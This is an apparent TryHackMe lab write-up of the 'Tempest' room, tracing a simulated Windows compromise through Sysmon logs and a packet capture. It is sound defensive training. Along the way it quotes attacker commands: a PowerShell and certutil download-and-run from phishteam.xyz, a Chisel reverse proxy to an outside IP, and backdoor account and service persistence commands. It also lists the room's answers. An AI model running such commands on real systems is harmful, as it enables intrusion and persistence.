# TryHackMe — Tempest Incident Writeup

## Room Overview
This room aims to introduce the process of analysing enpoint and network logs from a compromised asset. You will be tasked to be one of the incident responders who will handle and analyse captured artifacts of the Tempest machine.

## Prerequisites
The responder should have previous knowledge of windows event logs, specifically sysmon. They should also be familiar with Wireshark. Accessing the machine can be done via RDP or in the browser. If you decide to access it through RDP, the IP is generated, Username is `user` and Password is `Investigatem3!`.

Join the room [Tempest](https://tryhackme.com/room/tempestincident) and start the machine.

### Task 3: Preparation - Tools and Artifacts
Before conducting the investigation let's look at the incident files and their hashes. The files are located in `C:\\Users\\user\\Desktop\\Incident Files` and their names are: `capture.pcapng`, `sysmon.evtx` and `windows.evtx`. We can get their SHA256 hashes with the powershell command `Get-FileHash *` in the respective folder.

>CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
>665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
>D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

### Task 4: Initial Access - Malicious Document
SOC analyst report the intrusion started with a malicious **.doc** file which was downloaded via **chrome.exe**. The document executed a chain of commands to attain code execution.

For this task use the EvtxEcmd tool located at `C:\\Tools\\EvtxECmd`, Timeline Explorer (GUI tool for reading logs from CSV files).

To parse the logs convert the sysmon .evtx file to a .csv file using the EvtxECmd tool, so we can later access it using the Timeline explorer and SysmonView tool.

`C:\\Tools\\EvtxEcmd\\EvtxECmd.exe -f 'C:\\Users\\user\\Desktop\\Incident Files\\sysmon.evtx' --csv 'C:\\Users\\user\\Desktop\\Incident Files' --csvf sysmon.csv`

Next open up the .csv file in the Timeline Explorer tool to display and analyse the logs. Since the malicios document is a **.doc** file we can look for it with the search bar. When a file is downloaded, it's sysmon event ID is 11, so we can filter for that specific ID, which gives us further insight.

![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302143400.png)
>Filename: *free_magicules.doc*
>Compromised user and machine: *benimaru-TEMPEST*

To find the PID of the of the process that opened the file, we filter for Event Id = 1 (which is process creation) while keeping the .doc search string. Then we just scroll to the payload field to find the PID.

>PID: *496*

To look for the IPv4 address resolved by the malicious domain the user has to apply filter for Event Id = 22, which is a DNS query sysmon event. The Payload Data1 field should also be applied as a filter as the ProcessID and ProcessGUID stay unchanged.

![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302145433.png)

From here we can find the domain phishteam.xyz, but if we take a look at the payload we can find the IPv4 address in question: 
>*167.71.199.191* 

Now, these logs contain no Executable information so we have to search for the 496 Process ID and find the base64 encoded string in the payload:
>JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

Then we use Cyberchef to decode the string.
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302150313.png)
The payload does the following:
1) Gets and saves the path for the application to the ApplicationData folder
2) Downloads a file update.zip from the malicious phishteam[.]xyz to the Startup folder
3) Extracts the ZIP file and then deletes it

If we look at the command that contains the base64 encoded string we can find `msdt.exe` being ran as well as `mpsigstub.exe`. The vulnerability name is Follina and it allows the malicious Word document to execute PowerShell. With a quick Google search we can find the CVE number of the exploit.
>CVE: *2022-30190*

### Task 5: Initial Access - Stage 2 execution
As we've seen in the previous task the malware creates a file in the startup folder. To find it's full path we search for the string "startup".
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302151644.png)
>Full target path: *C:\\Users\\benimaru\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.zip*

Since we already know the payload is being downloaded from phishteam[.]xyz domain, to find the executed command on startup we have to look for the phishteam domain through the search bar.

To save yourself the trouble make sure you remove the double quotes before submitting the answer.
>`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe`

From here we can see that the malware downloads a file first.exe and runs it. The SHA256 hash of the file can be found in the Payload Data3 field of the log which contains first.exe in the Executable Info field.
>SHA256:*CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8*

![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302153455.png)

For the next question, we already know there is a C2 server connection, which makes the Event Id = 22, sysmon event id for DNS querries. Looking at the logs we see the domain name appear multiple times.
>Domain and port: *resolvcyber.xyz:80*

### Task 6: Initial Access - Malicious Document Traffic
From this point on we'll use Wireshark to investigate the packets generated by the malware.
Filtering the capture file for HTTP that contains "phishteam" already gives as the *free_magicules.doc* and the URL we're looking for.

>URL: [http://phishteam.xyz/02dcf07/index.html](http://phishteam.xyz/02dcf07/index.html)

From previous questions we know the attacker uses base64 encoding. We can also check by running a `http contains "resolve"` as a query. After which we decode the string after the `q=`
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302155301.png)
With this we've already answered the next question.
>Parameter: *q*

We've also answered the next question by looking at the URL before the parameter *q*
> URL: */9ab62b5*

The method used by the binary is confirmed in the info column.
> HTTP method: *GET*

User agent used in the compilation of the binary is displayed in the request, from which we can get the programming language the attacker used to compile the binary.
>Programming language: nim

![](THM-Writeups/Tempest/assets/2026-03-02-155939_hyprshot.png)

### Task 7: Discovery - Internal Reconnaissance

To uncover a sensitive file on the users machine we have to look at the decoded query strings in the URLs. So update the filter to look for `/9ab62b5?q=`. Decode the base64 commands using CyberChef until you find the file in question and it's password.

![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302163110.png)
>Password: *infernotempest*

Continue decoding the base64 strings until you find the netstat command being executed with all the ports enumerated. The port that provides a remote shell inside the machine is the default port for Windows Remote Management.
>Port: *5985*

Since I couldn't find commands that show the reverse proxy execution I went back to the Timeline Explorer app to investigate further and searched for the `phishteam.xyz` domain. That got me nowhere. After that I searched for `powershell.exe` and found a log containing `ch.exe`, which I used for further investigation. I then found the command setting up the reverse SOCKS proxy.
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302165236.png)
>Command: *C:\\Users\\benimaru\\Downloads\\ch.exe client 167.71.199.191:8080 R:socks*

The SHA256 of the binary can be found in the Payload Data3 field.
>SHA256 Hash: *8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451*

I then used VirusTotal to find the name of the file by inputting the SHA256 hash into the search field.
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302165859.png)
>Name: *chisel*

After the reverse proxy being setup we see the command `C:\\Windows\\system32\\wsmprovhost.exe -Embedding`. Then after googling what service is it we find the answer.
>Service: *winrm*

### Task 8: Privilege Escalation - Exploiting Privileges

After discovering the privileges of the current user, the attacker downloads another binary for privilege escalation. We can find it by finding the log for reverse proxy and the scrolling to find the next executable commands. We can find the hash by tracing the child process of wsmprovhost.exe.
> Binary name and hash: *spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D*

By looking up the SHA256 on VirusTotal we get the tool name.
>Name: *printspoofer*

The privilege that the malware exploits can be found on a github page of the printspoofer. The malware specifically targets Windows 10 and Server 2016/2019 machines.
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302171732.png)
>Privilege: *SeImpersonatePrivilege*

Looking at the logs we searched for in the previous questions we can see the binary used to establish a C2 connection.
> Name: *final.exe*

Further investigating leads us to a process with PID 8264, which contains the destination port in the payload data.
>Destination port: *8080*

### Task 9: Actions on Objective - Fully-owned Machine

After achieving SYSTEM access with `final.exe` the attacker created two user account which can be found by looking at the logs after the `final.exe` execution.
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302173633.png)
>Users: *shion,shuna*

The attacker failed in account creation as the command was missing an option.
>Option: */add*

The event ID for account creation can be found with a google search.
>Event ID: *4720*

One of the accounts was added to a localgroup called administrator. We can find the command the attacker used simply by searching for localgroup.
>Command: *net localgroup administrators /add shion*

The account was successfully added to a sensitive group. We can find the event ID with a simple Google search.
>Event ID: *4732*

After creating the accounts, the attacker established persistent administrative access. The command executed can be found by searching for `final.exe` and looking at the Executable Info field. We can see the attacker using `TempestUpdate2` in the command as well as the `final.exe` with goals of the malware autostarting.
![](THM-Writeups/Tempest/assets/Pasted%20image%2020260302175136.png)

>Command: *C:\\Windows\\system32\\sc.exe \\\\TEMPEST create TempestUpdate2 binpath= C:\\ProgramData\\final.exe start= auto*

### Summary
The **Tempest Incident** is a TryHackMe room simulating a full attack chain on a Windows endpoint. The attacker gained initial access by delivering a malicious Word document (`free_magicules.doc`) that exploited **CVE-2022-30190 (Follina)** — abusing the `ms-msdt` URI protocol to execute PowerShell without macros. A base64-encoded payload downloaded `update.zip` from `phishteam[.]xyz` into the Startup folder, ensuring persistence. Stage 2 used `first.exe` (a Nim-compiled binary) connecting to `resolvcyber.xyz:80` as a C2 server. The attacker then performed internal reconnaissance via encoded GET requests, used **Chisel** (`ch.exe`) to establish a reverse SOCKS proxy back to `167.71.199.191:8080`, and pivoted via WinRM (port 5985). Privilege escalation was achieved through **PrintSpoofer** (`spf.exe`), exploiting **SeImpersonatePrivilege** to reach SYSTEM. Finally, the attacker created backdoor accounts (`shion`, `shuna`), added `shion` to the Administrators group, and installed a persistent service (`TempestUpdate2`) running `final.exe`.
